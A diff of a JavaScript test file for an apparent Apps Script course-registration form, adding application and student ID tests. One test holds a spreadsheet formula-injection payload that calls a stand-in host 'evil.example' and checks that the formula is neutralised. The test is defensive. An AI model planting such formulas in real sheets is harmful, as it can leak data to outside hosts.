@@ -74,6 +74,7 @@ const base = () => ({
   form: 'mic-online-2027',
   website: '',
   email: 'test@example.com',
+  name: 'Somchai Jaidee',
   consent: 'Agree',
   answers: [['Email', 'test@example.com'], ['First name', 'Somchai'], ['What is your WhatsApp number?', '+66 81 234 5678'], ['Agree?', 'Agree']],
 });
@@ -88,10 +89,12 @@ test('POST saves a row with headers and emails a copy', () => {
   const env = makeEnv();
   assert.deepEqual(env.post(base()), { ok: true, emailed: true });
   const cells = env.sheets[tab].cells;
-  assert.deepEqual(cells[0], ['Timestamp', 'Email', 'First name', 'What is your WhatsApp number?', 'Agree?']);
-  assert.ok(cells[1][0] instanceof Date || Object.prototype.toString.call(cells[1][0]) === '[object Date]');
-  assert.equal(cells[1][2], 'Somchai');
-  assert.equal(cells[1][3], ' +66 81 234 5678', 'leading + is guarded with a space');
+  assert.deepEqual(cells[0], ['Application ID', 'Student ID', 'Timestamp', 'Email', 'First name', 'What is your WhatsApp number?', 'Agree?']);
+  assert.equal(cells[1][0], 'MIC27-0001');
+  assert.equal(cells[1][1], 'WIF-00001');
+  assert.ok(cells[1][2] instanceof Date || Object.prototype.toString.call(cells[1][2]) === '[object Date]');
+  assert.equal(cells[1][4], 'Somchai');
+  assert.equal(cells[1][5], ' +66 81 234 5678', 'leading + is guarded with a space');
   assert.equal(env.mails.length, 1);
   assert.equal(env.mails[0].to, 'test@example.com');
   assert.equal(env.mails[0].replyTo, 'wif.meditation@gmail.com');
@@ -115,7 +118,41 @@ test('formula answers are never run', () => {
   const b = base();
   b.answers[1] = ['First name', '=IMPORTXML("http://evil.example","//a")'];
   env.post(b);
-  assert.equal(env.sheets[tab].cells[1][2], ' =IMPORTXML("http://evil.example","//a")');
+  assert.equal(env.sheets[tab].cells[1][4], ' =IMPORTXML("http://evil.example","//a")');
+});
+
+test('each application gets an Application ID and each person a Student ID', () => {
+  const env = makeEnv();
+  env.post(base());
+  const students = env.sheets['Students'].cells;
+  assert.deepEqual(students[0], ['Student ID', 'Email', 'Name', 'First registered', 'Last registered', 'Applications']);
+  assert.equal(students[1][0], 'WIF-00001');
+  assert.equal(students[1][1], 'test@example.com');
+  assert.equal(students[1][2], 'Somchai Jaidee');
+  assert.equal(students[1][5], 1);
+});
+
+test('the same person keeps one Student ID; each application gets its own Application ID', () => {
+  const env = makeEnv();
+  env.post(base());
+  env.post({ ...base(), email: 'TEST@Example.com', name: 'Somchai J.' }); // same person, different case
+  env.post({ ...base(), email: 'other@example.com', name: 'Malee' }); // a different person
+  const cells = env.sheets[tab].cells;
+  assert.deepEqual([cells[1][0], cells[2][0], cells[3][0]], ['MIC27-0001', 'MIC27-0002', 'MIC27-0003']);
+  assert.deepEqual([cells[1][1], cells[2][1], cells[3][1]], ['WIF-00001', 'WIF-00001', 'WIF-00002']);
+  const students = env.sheets['Students'].cells;
+  assert.equal(students.length, 3, 'header + two people');
+  assert.equal(students[1][5], 2, 'the first person applied twice');
+  assert.equal(students[1][2], 'Somchai J.', 'name refreshed to the latest');
+  assert.equal(students[2][0], 'WIF-00002');
+  assert.equal(students[2][1], 'other@example.com');
+});
+
+test('the confirmation email shows the application reference', () => {
+  const env = makeEnv();
+  env.post(base());
+  assert.match(env.mails[0].body, /application reference is MIC27-0001\./);
+  assert.match(env.mails[0].htmlBody, /application reference is MIC27-0001\./);
 });
 
 test('HTML in answers is escaped in the email', () => {
@@ -183,6 +220,7 @@ test('the real config opens 1 November 2026 and closes 10 January 2027, Bangkok 
   const real = fs.readFileSync(new URL('./Code.gs', import.meta.url), 'utf8');
   assert.match(real, /opens: '2026-11-01'/);
   assert.match(real, /closes: '2027-01-10'/);
+  assert.match(real, /prefix: 'MIC27'/);
   assert.equal(vm.runInContext("longDate_('2026-11-01')", env.ctx), '1 November 2026');
 });
 
